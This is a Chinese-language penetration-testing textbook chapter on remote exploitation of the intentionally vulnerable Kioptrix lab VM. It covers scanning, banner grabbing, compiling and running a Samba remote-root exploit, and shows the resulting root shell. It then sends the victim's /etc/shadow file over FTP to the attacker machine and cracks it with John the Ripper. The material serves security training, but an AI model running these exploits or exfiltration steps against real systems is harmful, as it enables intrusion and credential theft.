# 第四章。远程利用

我们已经收集了数据，审查了信息，并为我们渗透测试的下一阶段选择了一些可能的目标。现在是时候走额外的一英里，证明发现的漏洞可能对底线产生影响。毕竟，这是你的客户需要了解和理解的关于他们的环境的。在本章中，我们将快速回顾利用的基础知识，然后转向更有趣的技术和方法，让我们了解我们正在测试的网络环境的真正安全状况。本章讨论的感兴趣的项目包括以下内容：

+   向我们的沙盒虚拟网络添加一个易受攻击的机器，使你能够跟着本书中的例子进行操作

+   编译和/或重写在互联网上找到的概念证明利用代码

+   使用公开可用的利用代码手动利用远程漏洞

+   将文件传输到受害者机器和从受害者机器传输文件

+   使用 John the Ripper 进行密码破解

+   使用 THC Hydra 进行暴力破解

+   Metasploit-学习并喜欢它

# 利用-为什么要费心？

你的潜在客户很可能不理解进行全面渗透测试的好处。仅仅枚举网络环境中已知的漏洞是不足以真正了解公司综合安全控制的有效性的；做好准备。

以下是完全利用提供的常见好处的快速清单：

+   **消除猜测和怀疑：**通过提供关键基础设施设备被攻破的证据，因此机密数据可能已经泄露、被篡改或不可用，问题变得“真实”，管理团队将拥有采取纠正措施所需的必要细节。

+   **验证缓解控制实际上...缓解：**与盲目接受理论缓解控制实际上有效不同，全面利用渗透测试使管理层能够证明安全措施正在按预期工作。

+   **发现安全架构中容易被忽视的漏洞：**受保护环境的管理员可能错误地认为，他们所拥有的各种安全层保护了机密数据的保密性、完整性和可用性。不幸的是，所有这些安全措施都存在使事情变得更加复杂的固有风险，从而为攻击者利用漏洞引入了新的可能性。完全利用渗透测试验证了网络中是否存在未知的安全漏洞。

进行全面渗透测试对企业可能有许多其他有用之处（除了可以勾选复选框的事实）。在与企业所有者或经理会面时，试着了解对他们的底线来说什么是重要的，并尝试确定你的技能和服务如何适应其中。

# 目标实践-添加 Kioptrix 虚拟机

渗透测试是一项需要练习才能做到完美的技能。为了鼓励本章节中材料的吸收，我们将添加一个有意地易受攻击的 Linux 发行版，由 Steven McElrea（又名 loneferret）和 Richard Dinelle（又名 haken29a）的[www.kioptrix.com](http://www.kioptrix.com)团队提供。前往[`www.kioptrix.com`](http://www.kioptrix.com)网站，选择你喜欢的语言，然后点击页面右侧的**Kioptrix VM Level 1**链接。

![目标实践-添加 Kioptrix 虚拟机](img/7744_04_01.jpg)

一旦下载完成并将文件提取到所选文件夹中，我们将需要在我们的 Oracle VirtualBox 渗透测试实验室中创建一个新的虚拟机，并指示它使用我们已下载的虚拟机：

+   名称：Kioptrix VM Level 1

+   操作系统类型：其他 Linux

+   内存：256

+   启动磁盘：Kioptrix Level 1.vmdk（正常，3.00 GB）

确保选择**使用现有硬盘**选项：

![目标实践-添加 Kioptrix 虚拟机](img/7744_04_02.jpg)

一旦进程成功完成，您应该验证您的设置是否与以下匹配：

![目标实践-添加 Kioptrix 虚拟机](img/7744_04_03.jpg)

尽管我们将讨论一些复杂的方法和技术，但最好使用简单的机制来真正理解我们的利用是如何工作的。通过消除复杂性，我们可以专注于教训而不是耗时的故障排除。

### 提示

Kioptrix Level 1 虚拟机将从您的 DHCP 服务器获取 IP 地址。如果您尚未这样做，可以启用预先安装在 Oracle 虚拟盒中的内置 DHCP 服务器。您可以使用位于 Oracle 虚拟盒中的命令行 VBoxManage 工具进行配置。以下是`dhcpserver` add 命令的示例：

`VBoxManage dhcpserver add netname Wlan1 ip 192.168.75.100 netmask 255.255.255.0 lowerip 192.168.75.101 upperip 192.168.75.150 enable`

前面的命令将导致虚拟盒为连接到`Wlan1`网络的网络适配器提供 DHCP 服务。任何在内部网络`Wlan1`上请求 IP 的系统都将在`192.168.75.101`和`192.168.75.150`之间接收一个地址。

**注意：**在 OSX 上，该命令将需要为每个使用的选项使用双划线。

有关 VboxManage 工具的更详细描述，请访问：[`www.virtualbox.org/manual/ch08.html`](http://www.virtualbox.org/manual/ch08.html)。

要跟随本章中的许多示例，您需要启动并运行 Kioptrix。启动 VirtualBox，将 Kioptrix 和 Backtrack Tester 1 会话的网络适配器指向 Wlan1，并启动两者。现在是时候回顾一些基本的利用方法了。

### 注意

使用`dhclient <interface name>`命令来获取 BackTrack 机器的 DHCP 地址。例如：`dhclient int0`。

# 手动利用

在这一点上，我们应该在我们的虚拟环境中准备好两个系统：我们的 Kioptrix Level 1 机器将是我们的目标，我们的 BackTrack 机器将扮演攻击者的角色。在我们开始利用之前，我们需要确定我们的攻击计划。

![手动利用](img/7744_04_04.jpg)

## 枚举服务

我们将首先使用`nmap`在我们的网络上找到机器。打开一个新的终端会话并键入：

```
nmap -f -n -P0 -v -p- -T4 192.168.75.0/24 

```

我们已经指示`nmap`使用**分段**数据包扫描 192.168.75.X 上的所有 TCP 端口的 IP。以下是结果的摘录：

```
Scanning 192.168.75.14 [65535 ports]
Discovered open port 139/tcp on 192.168.75.14
Discovered open port 80/tcp on 192.168.75.14
Discovered open port 22/tcp on 192.168.75.14
Discovered open port 443/tcp on 192.168.75.14
Discovered open port 111/tcp on 192.168.75.14
Discovered open port 32768/tcp on 192.168.75.14
Completed SYN Stealth Scan at 10:24, 8.05s elapsed (65535 total ports)
Nmap scan report for 192.168.75.14
Host is up (0.00017s latency).
Not shown: 65529 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
111/tcp open rpcbind
139/tcp open netbios-ssn
443/tcp open https
32768/tcp open filenet-tms
MAC Address: 08:00:27:21:21:62 (Cadmus Computer Systems)
Read data files from: /usr/local/bin/../share/nmap
Nmap done: 256 IP addresses (3 hosts up) scanned in 202.60 seconds
Raw packets sent: 262797 (11.555MB) | Rcvd: 131203 (5.249MB)

```

看一下突出显示的部分。您会注意到我们的目标机器有几个开放的 TCP 端口`22、80、111、139、443`和`32768`。

现在我们知道系统已经启动，并且结果表明有多个服务正在运行，我们有很多选择。我们可以使用`netcat`或其他类似的程序手动探测这些端口，以获取更多信息并可能获取一些横幅，或者我们可以开始对目标机器进行更彻底的扫描。

### 使用 Unicornscan 进行快速扫描

请记住，在选择工具时有许多可用的选项可供考虑。Unicorn scan 是一个非常快速的扫描程序，可以快速为我们扫描虚拟实验室。如果您的 Backtrack 版本没有安装 unicornscan，请在尝试以下示例之前使用以下命令语法：`apt-get install Unicornscan`。

### 提示

在 BackTrack 5 R1 中，您必须将`GeoIP.dat`文件复制到您的`etc`目录以避免错误。您可以执行以下命令来解决错误：

```
cp /usr/share/GeoIP/GeoIP.dat /usr/local/etc/ unicornscan/ 

```

以下命令将在`192.168.75.0/24`段上扫描所有 TCP 端口（`-mT`是默认扫描类型），使用每秒`500`个数据包（`-r500`）。我们已经指示命令在接收到信息时提供给我们信息（使用`-I`选项）：

```
# unicornscan -mT -r500 -I 192.168.75.0/24 

```

这将导致以下结果：

```
TCP open 192.168.75.14:32768 ttl 64
TCP open 192.168.75.14:22 ttl 64
TCP open 192.168.75.14:443 ttl 64
TCP open 192.168.75.14:139 ttl 64
TCP open 192.168.75.14:80 ttl 64
TCP open 192.168.75.2:80 ttl 64
TCP open 192.168.75.2:53 ttl 64
TCP open 192.168.75.14:111 ttl 64
TCP open domain[ 53] from 192.168.75.2 ttl 64
TCP open http[ 80] from 192.168.75.2 ttl 64
TCP open ssh[ 22] from 192.168.75.14 ttl 64
TCP open http[ 80] from 192.168.75.14 ttl 64
TCP open sunrpc[ 111] from 192.168.75.14 ttl 64
TCP open netbios-ssn[ 139] from 192.168.75.14 ttl 64
TCP open https[ 443] from 192.168.75.14 ttl 64
TCP open filenet-tms[32768] from 192.168.75.14 ttl 64 

```

我们还可以扫描开放的 UDP 端口，以完整地了解情况：

```
# unicornscan -mU -r500 -I 192.168.75.0/24 

```

在特定虚拟网络上会得到以下输出（您的扫描结果将根据当前实验室设置而变化）：

```
UDP open 192.168.75.2:53 ttl 64
UDP open 192.168.75.255:53 ttl 64
UDP open 192.168.75.2:161 ttl 64
UDP open 192.168.75.14:32768 ttl 64
UDP open 192.168.75.14:137 ttl 64
UDP open 192.168.75.14:111 ttl 64
UDP open domain[ 53] from 192.168.75.2 ttl 64
UDP open snmp[ 161] from 192.168.75.2 ttl 64
UDP open sunrpc[ 111] from 192.168.75.14 ttl 64
UDP open netbios-ns[ 137] from 192.168.75.14 ttl 64
UDP open filenet-tms[32768] from 192.168.75.14 ttl 64 
UDP open domain[ 53] from 192.168.75.255 ttl 64

```

仔细审查前面输出的突出显示结果。这些信息将用于确定针对目标系统执行哪些攻击。

## 使用 Nmap 进行完整扫描

现在我们知道将要针对哪个系统进行攻击，让我们看看有针对性的`nmap`扫描会为我们提供什么：

```
# nmap -n -sTUV -pT:22,80,111,139,443,32768,U:111,137,32768 192.168.75.14 

```

在这里，我们决定对我们的开放端口进行 UDP 和 TCP 扫描，以确定它们的**状态**。我们使用`-sTUV`开关通知 nmap 我们正在寻找 UDP 和 TCP，并提供软件版本；然后使用`-p`选项指定要扫描的端口范围。`U:`表示端口是 UDP。以下是输出：

```
Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-11-13 11:27 EST
Nmap scan report for 192.168.75.14
Host is up (0.00089s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp open rpcbind
139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open ssl/http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
32768/tcp open rpcbind
111/udp open rpcbind
137/udp open netbios-ns Microsoft Windows XP netbios-ssn
32768/udp open rpcbind
MAC Address: 08:00:27:21:21:62 (Cadmus Computer Systems)
Service Info: Host: KIOPTRIX; OS: Windows
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds

```

现在我们有了可以使用的信息。我们知道哪些端口是开放的，也大致知道哪些服务正在运行。

### 注意

注意到 OS: Windows 的结果表明这是一台 Windows 机器，但实际上并不是。审查所有数据以做出这些判断非常重要，不要仅仅依赖于一个结果。

如果您审查结果，可能会注意到此机器上运行着许多过时的服务。我们将利用这一事实，并使用常见的已知漏洞来破坏该单位。我们可能需要手动验证这些结果。现在我们尝试抓取一些横幅，看看我们正在处理什么。

## 使用 Netcat 和 Ncat 进行横幅抓取

Netcat 是一个非常强大的工具，可以在枚举和利用阶段使用，甚至可以用于文件传输或创建后门。我们还将 Netcat 与 Ncat 进行比较，后者是 Nmap 团队提供的工具之一。

### 使用 Netcat 进行横幅抓取

为了连接到`192.168.75.14`上的端口`80`，我们可以使用以下命令：

```
# nc 192.168.75.14 80 

```

这将连接我们到 Kioptrix 机器上的 Web 服务器。我们需要调用一个命令来接收信息输出。输入：

```
HEAD / HTTP 1.1 

```

按*Enter*键两次并查看输出：

```
HTTP/1.1 200 OK
Date: Fri, 11 Nov 2011 21:19:49 GMT
Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
Last-Modified: Thu, 06 Sep 2001 03:12:46 GMT
ETag: "8805-b4a-3b96e9ae"
Accept-Ranges: bytes
Content-Length: 2890
Connection: close
Content-Type: text/html

```

这看起来很熟悉。我们已经讨论过 HTTP 标头的好处；上面的信息表明该机器正在运行 Apache 1.3.20，RedHat Linux，使用`mod_ssl`版本 2.8.4 和`OpenSSL`版本 0.9.6b。

### 注意

在测试过程中记录任何操作是一个好习惯。这将帮助您在将来与客户的交谈中，并且还可以轻松地在以后复制您的测试。

这个过程也可以继续进行其他端口。

### 使用 Ncat 进行横幅抓取

Ncat 也可以用于抓取`http`横幅。操作方法如下：

```
# ncat 192.168.75.14 80 

```

Ncat 使用与 Netcat 相同的语法进行连接。输入以下内容并按*Enter*键两次：

```
HEAD / HTTP 1.1 

```

我们得到以下输出：

```
HTTP/1.1 200 OK
Date: Fri, 11 Nov 2011 21:50:53 GMT
Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
Last-Modified: Thu, 06 Sep 2001 03:12:46 GMT
ETag: "8805-b4a-3b96e9ae"
Accept-Ranges: bytes
Content-Length: 2890
Connection: close
Content-Type: text/html

```

在`google.com`上快速搜索`mod_ssl/2.8.4`会显示存在我们可以利用的漏洞。

### 使用 smbclient 进行横幅抓取

一个特别有趣的端口是 139/TCP。使用`smbclient`工具，我们可以抓取此服务器的横幅。让我们试一试：

```
# smbclient -L 192.168.75.14 -N 

```

此命令调用`smbclient`并指示它连接到`192.168.75.14`，然后显示服务器信息。`-N`开关表示我们没有此连接的根密码。结果如下：

```
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
Sharename Type Comment
--------- ---- -------
cli_rpc_pipe_open_noauth: rpc_pipe_bind for pipe \srvsvc failed with error ERRnosupport
IPC$ IPC IPC Service (Samba Server)
ADMIN$ Disk IPC Service (Samba Server)
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a] 
Server Comment
--------- -------
KIOPTRIX Samba Server
Workgroup Master
--------- -------
MYGROUP KIOPTRIX

```

注意`Samba`版本是`2.2.1a`。我们将使用这些信息搜索此服务的任何已知漏洞。

## 搜索 Exploit-DB

在`Exploit-DB.com`上，您将能够找到关于已知漏洞和验证其有效性的概念代码的丰富信息。使用提供的概念代码可以帮助您确定您的特定软件是否容易受到这些攻击。概念代码还提供了一种理解个别漏洞的基本原理的机制，从而使您能够确保您的缓解控制是否正常运行。`Exploit-DB.com`团队花费了很多个人时间来确保提交的概念代码实际上按照描述的方式工作。

### 注意

如果您正在尝试从受限的虚拟实验室内访问此网站，您需要确保您的 BackTrack 盒子上设置了允许这样做的网络适配器。然而，建议您**不要**以任何方式将您的实验室连接到互联网。有几种安全的方法可以将文件传输到您的虚拟机——试试看！

让我们搜索与 Samba 版本 2.2.1a 相关的漏洞。

1.  转到[`www.exploit-db.com`](http://www.exploit-db.com)。

1.  点击顶部导航栏中的“搜索”。![搜索 Exploit-DB](img/7744_04_05.jpg)

1.  一旦进入搜索页面，在**描述：**字段中键入**Samba**。

1.  在**端口：**字段中键入**139**。

1.  点击**搜索**按钮。![搜索 Exploit-DB](img/7744_04_06.jpg)

如果有任何结果，您将看到与您的搜索匹配的漏洞列表。我们需要查看这些结果，看看是否有任何看起来适合我们需求的。

## 手头的 Exploit-DB

使用 BackTrack 的一个非常棒的方面是，团队自动包括`exploit-db.com`数据库的本地副本作为分发的一部分。您可以通过转到`/pentest/exploits/exploitdb`并使用`./searchsploit`命令后跟搜索词来搜索此列表。

```
# ./searchsploit samba 

```

这将产生以下输出：

```
Description Path
------------------------------------------------------------- Samba 2.2.x Remote Root Buffer Overflow Exploit /linux/remote/7.pl
Samba 2.2.8 Remote Root Exploit - sambal.c /linux/remote/10.c 
Samba 2.2.8 (Bruteforce Method) Remote Root Exploit /linux/remote/55.c
MS Windows XP/2003 Samba Share Resource Exhaustion Exploit /windows/dos/148.sh
Samba <= 3.0.4 SWAT Authorization Buffer Overflow Exploit /linux/remote/364.pl
Sambar FTP Server 6.4 (SIZE) Remote Denial of Service Exploit /windows/dos/2934.php
GoSamba 1.0.1 (include_path) Multiple RFI Vulnerabilities /php/webapps/4575.txt
Samba 3.0.27a send_mailslot() Remote Buffer Overflow PoC /linux/dos/4732.c
Samba (client) receive_smb_raw() Buffer Overflow Vulnerability PoC /multiple/dos/5712.pl
Samba (client) receive_smb_raw() Buffer Overflow Vulnerability PoC /multiple/dos/5712.pl
Samba < 3.0.20 Remote Heap Overflow Exploit (oldie but goodie) /linux/remote/7701.txt
Samba 2.2.0 - 2.2.8 trans2open Overflow (OS X) /osX/remote/9924.rb
Samba 2.2.x nttrans Overflow /linux/remote/9936.rb
Samba 3.0.21-3.0.24 LSA trans names Heap Overflow /linux/remote/9950.rb
Samba 3.0.10 - 3.3.5 Format String And Security Bypass Vulnerabilities /multiple/remote/10095.txt
Samba Multiple DoS Vulnerabilities /linux/dos/12588.txt
Samba ""username map script"" Command Execution /unix/remote/16320.rb
Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow /linux/remote/16321.rb
Samba lsa_io_trans_names Heap Overflow /solaris/remote/16329.rb
Samba trans2open Overflow (Solaris SPARC) /solaris/sparc/remote/16330.rb
Sambar 6 Search Results Buffer Overflow /windows/remote/16756.rb
Samba lsa_io_trans_names Heap Overflow /linux/remote/16859.rb
Samba chain_reply Memory Corruption (Linux x86) /linux/remote/16860.rb
Samba trans2open Overflow (Linux x86) /linux/remote/16861.rb
Samba lsa_io_trans_names Heap Overflow /osX/remote/16875.rb
Samba trans2open Overflow (Mac OS X PPC) /os-x/ppc/remote/16876.rb
Samba trans2open Overflow (*BSD x86) /linux/remote/16880.rb

```

我们将尝试使用 C 语言编写的`Samba 2.2.8 远程根漏洞利用 - sambal.c`，位于`/linux/remote/10.c`。这种特定的利用是使用 C 语言编写的，因此在使用之前必须进行编译。

```
# cp /pentest/exploits/exploitdb/platforms/linux/remote/10.c /root/10.c 

```

这个命令将文件复制到我们选择的目录，本例中是`/root`，这样更容易处理。有时文件可能会立即编译；在这种情况下，您可以简单地运行以下命令并继续进行下一阶段。

### 注意

**要小心！**

您必须理解正在编译的代码。在这一点上，我们正在针对受限的实验室环境进行测试，但是当到达在连接到外部世界的环境中执行这些任务的时候，代码既干净又来自可信任的来源是至关重要的。在尝试针对他人网络运行之前，您应该了解利用代码的每个阶段。许多人认为最好的方法是为手动利用创建自己的 shellcode，这样您就会准确知道运行时会发生什么。在将这种类型的代码投入实时生产之前，在自己的受控虚拟环境中对其进行单元测试，以充分了解您正在运行的代码的影响，特别是如果您选择的利用包括 shellcode 的话。

### 编译代码

在这里，我们将尝试在审查代码后不做任何修改地编译 10.c。这里执行的步骤对使用 C 语言编写的每种类型的利用代码都是相似的。

```
# vim 10.c 

```

审查此代码。滚动查看它，看看您是否能理解当运行此代码时会发生什么。

### 提示

如果您不熟悉 VIM，有几个网站提供了对这个复杂而强大工具的很好的评论。Packt Publishing 还提供了购买《Hacking VIM 7.2》，如果您想以简洁、实用的方式更多地了解它。现在，当您在 VIM 中时，您可以使用`:q`退出返回到 shell 提示符。

![编译代码](img/7744_04_07.jpg)

### 编译概念代码

代码审查完毕后，尝试编译它。使用`:q`命令序列退出 VIM，并在命令提示符下输入以下内容：

```
# gcc 10.c -o SambaVuln10 

```

我们正在调用 GCC 编译器，并将我们的 10.c 源代码文件输入并输出到文件`SambaVuln`。如果一切按计划进行，你将不会收到任何反馈，命令提示符将显示出来。

### 注意

有人认为编译概念验证利用的难度会减少脚本小子的数量，因为他们缺乏排除代码错误的技能。

一些安全研究人员甚至会故意添加错误，比如拼写错误，以阻止脚本小子将概念验证代码用于恶意用途。

如果你在编译过程中遇到任何问题，你需要仔细检查代码并解决问题，直到它能够正确编译。

### 代码故障排除

你可能会遇到的错误类型包括代码的注释不当、额外字符、无效格式或者甚至是故意输入的无效代码，以使新手编译更加困难。

让我们看一下在使用代码库中的代码时似乎经常出现的一个常见问题。

#### 所有这些^M 字符是什么，为什么它们不会消失？

你可能会查看你的代码，意识到你有一些（或者很多！）不需要的字符，比如^M，不管你怎么努力，它们就是不会消失。你可以使用 VIM 来解决这个问题，方法是在 VIM 中打开你的有问题的文件，然后输入`:%s/`，按下*Ctrl + V*，然后*Ctrl + M*，接着输入`//g`，结果如下。

```
:%s/^M//g

```

然后按*Enter*。这指示 VIM 删除整个文件中所有**^M**的出现（%s）。以下是我们将使用此命令删除的示例：

![所有这些^M 字符是什么，为什么它们不会消失？](img/7744_04_08.jpg)

#### 破碎的字符串-重聚

有时代码的格式可能不正确。重要的是要注意，这将使 GCC 处理变得非常困难。仔细检查代码，确保一切都是应该的。

![破碎的字符串-重聚](img/7744_04_09.jpg)

代码审查并纠正错误后，尝试再次编译，直到没有更多错误为止。

## 运行利用

希望前面的步骤相当轻松；清理别人提供的代码可能是一个繁琐的过程。如果利用代码编译正常，我们可以简单地执行它，看看还需要什么其他输入：

```
# ./SambaVuln10 

```

这个命令的输出如下：

```
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./SambaVuln10 [-bBcCdfprsStv] [host]
-b <platform> bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step> bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay> bruteforce/scanmode delay in micro seconds (default = 100000)
-f force
-p <port> port to attack (default = 139)
-r <ret> return address
-s scan mode (random)
-S <network> scan mode
-t <type> presets (0 for a list)
-v verbose mode

```

我们已经对我们的目标机器有了几个关键信息，包括它很可能在运行 Linux，并且 IP 地址是 192.168.75.14。让我们使用利用的扫描模式，看看我们是否遗漏了什么有趣的东西：

```
./SambaVuln10 -v -d 0 -S 192.168.75 

```

```
Samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Scan mode.
+ Verbose mode.
+ [192.168.75.14] Samba

```

我们可以看到我们的目标机器是通过`eSDee`在[www.netric.org](http://www.netric.org)上的概念验证远程根漏洞利用发现的。现在我们将继续，最终利用这台机器。

```
# ./SambaVuln10 -b 0 -v 192.168.75.14 

```

我们调用`SambaVuln10`文件；让它知道目标系统是 Linux，并提供指令来显示详细结果。输出如下：

```
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)

```

如果你是新手渗透测试，这个输出可能有点令人困惑。你刚刚成功获得了目标机器的 root 权限，此时你可以开始许多通常需要的后期利用步骤，以在网络中获得一个良好的立足点。你会注意到一些命令不起作用，而一些命令起作用。尝试以下操作：

```
# ls 

```

嗯...什么都没发生。也许你实际上没有获得 root 权限？让我们尝试一些不同的东西。

```
# cd /
# ls

```

这更像样了！现在你应该看到`/`的完整目录列表。

```
bin
boot
dead.letter
dev
etc
home
initrd
lib
lost+found
misc
mnt
opt
proc
root
sbin
tmp
usr
var

```

此时有许多其他命令可以使用，还有一些后期利用的技巧，我们将专门为此撰写一整章。在我们继续之前，我们将进行一次检查，看看这台机器上是否有什么有趣的东西：

您在这台机器上是谁？

```
whoami 

```

```
root

```

我连接到哪个系统？

```
hostname 

```

```
kioptrix.level1

```

```
lastlog 

```

谁登录到这个系统以及何时？

```
Username Port From Latest
root pts/0 192.168.1.200 Mon Oct 12 07:27:46 -0400 2009
bin **Never logged in**
daemon **Never logged in**
adm **Never logged in**
lp **Never logged in**
sync **Never logged in**
shutdown **Never logged in**
halt **Never logged in**
mail **Never logged in**
news **Never logged in**
uucp **Never logged in**
operator **Never logged in**
games **Never logged in**
gopher **Never logged in**
ftp **Never logged in**
nobody **Never logged in**
mailnull **Never logged in**
rpm **Never logged in**
xfs **Never logged in**
rpc **Never logged in**
rpcuser **Never logged in**
nfsnobody **Never logged in**
nscd **Never logged in**
ident **Never logged in**
radvd **Never logged in**
postgres **Never logged in**
apache **Never logged in**
squid **Never logged in**
pcap **Never logged in**
john pts/0 192.168.1.100 Sat Sep 26 11:32:02 -0400 2009
harold **Never logged in**

```

您可能已经知道，攻击者可以通过运行这个简单的概念验证代码在这台机器上获取 root 权限的事实是一个重大问题。您应该建议您的客户将所有已安装的软件更新到可能的最新版本，以避免这样简单的妥协。

# 从受害机器获取文件

在远程机器上获取 root 权限可能会很有趣，绝对是朝着正确方向迈出的重要一步（取决于您的范围和测试目的，这可能是唯一必要的步骤）。如果您的任务尚未完成，那么您需要找到传输数据到受害机器和从受害机器传输数据的方法。有几种工具可以帮助完成这项任务；以下是一些可能会让您的生活更轻松的工具。

## 在 BackTrack 5 上安装和启动 TFTP 服务器

TFTP 有时可能非常方便。许多系统已经安装了 TFTP 客户端，并且使用这种协议快速而简单。

```
# apt-get install atftpd 

```

### 注意

确保在安装过程中您的 BackTrack 机器已连接到互联网。要熟悉**atftpd**服务器，请在命令提示符中键入`atftpd`，而不需要任何其他输入。

通过键入以下内容，可以将 TFTP 作为独立守护程序启动，指向标准端口上的`/tmp`，并绑定到 IP 地址`192.168.75.12`：

```
# atftpd --daemon --port 69 --bind-address 192.168.75.12 /tmp 

```

您可以通过调用 netstat 并使用 69 进行 grep 来检查守护程序是否正确启动。

```
# netstat -anu |grep 69 

```

如果一切都正确启动，您应该看到类似于以下内容：

```
udp 0 0 192.168.75.12:69 0.0.0.0:*

```

## 安装和配置 pure-ftpd

如果您的 BackTrack 版本没有安装 pure-ftpd，则可以使用`apt-get install pure-ftpd`命令进行安装。为了完全使用 pure-ftpd 的功能，您需要在使用之前添加用户并进行其他较小的配置更改。

```
# echo /etc/pure-ftpd/pureftpd.pdb > PureDB 

```

将`/etc/pure-ftpd/pureftpd.pdb`添加到**PureDB**配置文件中：

```
# ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/50pure 

```

创建一个符号链接到`50pure`文件：

```
# groupadd -g 7777 ftpz 

```

向 BackTrack 客户机添加一个组：

```
# useradd -u 7777 -s /bin/false -d /dev/null -c "pureFTP" -g ftpz Testerz 

```

创建将要使用的文件夹：

```
# mkdir /var/ftp /var/ftp/public /var/ftp/public/ftplogin 

```

修改所有权：

```
# chown -R Testerz:ftpz /var/ftp/public/ftplogin 

```

将帐户添加到系统：

```
# pure-pw useradd ftplogin -u Testerz -d /var/ftp/public/ftplogin 

```

```
Password: password
Enter it again: password

```

设置一个可以与 FTP 连接一起使用的虚拟帐户：

```
# pure-pw mkdb 

```

重新加载数据库：

```
# pure-pw show ftplogin 

```

在 Pure-FTP 数据库中进行快速查找，以了解用户统计信息。

```
Login : ftplogin
Password : $1$/NF5jAg0$I0oRJKViA5NYs455Afelr1
UID : 7777 (Testerz)
GID : 7777 (ftpz)
Directory : /var/ftp/public/./
Full name :
Download bandwidth : 0 Kb (unlimited)
Upload bandwidth : 0 Kb (unlimited)
Max files : 0 (unlimited)
Max size : 0 Mb (unlimited)
Ratio : 0:0 (unlimited:unlimited)
Allowed local IPs :
Denied local IPs :
Allowed client IPs :
Denied client IPs :
Time restrictions : 0000-0000 (unlimited)
Max sim sessions : 0 (unlimited)

```

## 启动 pure-ftpd

以下命令将启动`pure-ftpd：`

```
#/etc/init.d/pure-ftpd start 

```

您将看到以下输出：

```
Starting ftp server: Running: /usr/sbin/pure-ftpd -l pam -8 UTF-8 -E -u 1000 -O clf:/var/log/pure-ftpd/transfer.log -B

```

可以通过连接到 localhost 来测试该服务器：

```
# ftp 127.0.0.1 

```

输出应该类似于以下内容：

```
Connected to 192.168.75.12.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 17:02\. Server port: 21.
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (192.168.75.12:root): ftplogin
331 User ftplogin OK. Password required
Password:
230-User ftplogin has group access to: 7777
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

### 注意

**生产环境与受控测试实验室环境之间的区别：**考虑在您的生产 BackTrack 实例上设置一个专用用户帐户和适当的安全措施。确保为 FTP 帐户提供必要的写入文件权限，否则，当从受害机器进行这些尝试时，预计会收到错误。

# 密码：您知道的东西…

在当今这个时代，人们可能会认为所有系统都使用多因素身份验证。不幸的是，情况并非如此。即使所谓的“安全网络”仍在使用发送明文密码的协议，系统仍在使用不安全的加密协议等。每个渗透测试人员都应该尝试掌握的一项基本技能（就像下棋一样：学起来容易，精通起来难）是密码破解的艺术。我们将从一些简单的例子开始，以巩固这个概念，然后转向该领域最优秀人员使用的一些策略。

## 破解哈希

繁忙的用户甚至管理员经常重复使用密码。无论网络上的系统有多重要，一旦您获得了密码哈希值，它们应立即被破解并添加到您已经放置的任何字典文件中。这可能会节省大量时间。

首先，我们需要从受害者机器中提取一些文件。启动您的 BackTrack Tester 1 和 Kioptrix Level 1 虚拟机，运行您之前编译的漏洞利用程序，并将`passwd`文件下载下来，以便我们可以对其运行 Jack。

1.  在实验室中启动所有必要的虚拟设备（BackTrack Tester 1，Kioptrix）。

1.  运行`./SambaVuln_10 -b 0 192.168.75.14`。

1.  您现在已连接为`kioptrix.level1`上的 root 用户。

1.  在您的 BackTrack 虚拟机上打开一个新的终端会话，并启动`pure-ftpd`。

1.  在连接到 Kioptrix 机器的 shell 中，使用 FTP 连接到 BackTrack 机器上的 FTP 服务器：

```
cd /etc

```

+   转到/ etc 目录。请记住，您将无法从受害者机器上获得太多反馈。

```
ls

```

+   您应该看到 Kioptrix /etc 目录的目录列表。

```
ftp 192.168.75.12 

```

+   在 BackTrack 机器上的 FTP 服务器上输入我们创建的用户名（ftplogin）。

```
Password: password 

```

+   输入 FTP 服务器帐户的密码。等待片刻，然后输入：

```
put shadow 

```

+   等待片刻，然后输入：

```
ls
exit

```

+   您应该看到目标 FTP 站点的目录列表。

1.  *CTRL + Q*将使您退出 Kioptrix 机器。

### 注意

您也可以简单地执行`cat shadow`并使用鼠标复制屏幕输出。然而，了解如何从目标机器中提取文件非常重要，特别是如果文件非常大的话。

现在我们在 BackTrack 机器上有了 shadow 文件，让我们看看我们能做些什么。

```
# cd /pentest/passwords/john 

```

一旦我们浏览到正确的目录，我们就可以针对我们的 Kioptrix shadow 文件启动 john：

```
# john /var/public/shadow 

```

